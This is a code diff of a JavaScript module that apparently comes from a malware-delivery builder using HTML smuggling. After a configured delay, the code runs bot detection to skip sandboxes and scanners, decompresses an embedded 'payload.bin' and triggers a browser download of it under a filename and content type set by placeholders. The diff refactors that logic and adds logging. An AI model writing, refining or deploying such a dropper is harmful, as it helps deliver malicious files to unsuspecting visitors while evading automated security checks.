@@ -1,34 +1,26 @@
-import { load } from "@fingerprintjs/botd";
 import { decompressSync, strToU8 } from "fflate";
 
 import payload from "./assets/payload.bin";
-import { download as down } from "./utils";
+import { download, isBot, sleep } from "./utils";
 
-export async function dontChangeFunctionName() {
+async function main() {
   // sleep before execution
-  await new Promise((r) => {
-    setTimeout(r, CONFIG_DELAY);
-  });
+  await sleep(CONFIG_DELAY);
 
   // antibot
   if (CONFIG_ANTIBOT) {
-    let isBot = false;
-    await load({
-      monitoring: false,
-    })
-      .then((botd) => botd.detect())
-      .then((result) => {
-        // dirty hack to bypass obfuscator renameProperties
-        isBot = Object.values(result).some((val) => val === true);
-      })
-      .catch(() => {});
-    if (isBot) {
+    const ib = await isBot();
+    if (ib) {
+      console.log("Detected bot, exit");
       return;
     }
   }
 
   // data decompressing and downloading
+  console.log("Downloading data. Compressed:", CONFIG_COMPRESS);
   let data = strToU8(payload, true);
   data = CONFIG_COMPRESS ? decompressSync(data) : data;
-  down(data, "dont_change_filename_var", "dont_change_content_type_var");
+  download(data, "dont_change_filename_var", "dont_change_content_type_var");
 }
+
+export { main as dontChangeFunctionName };
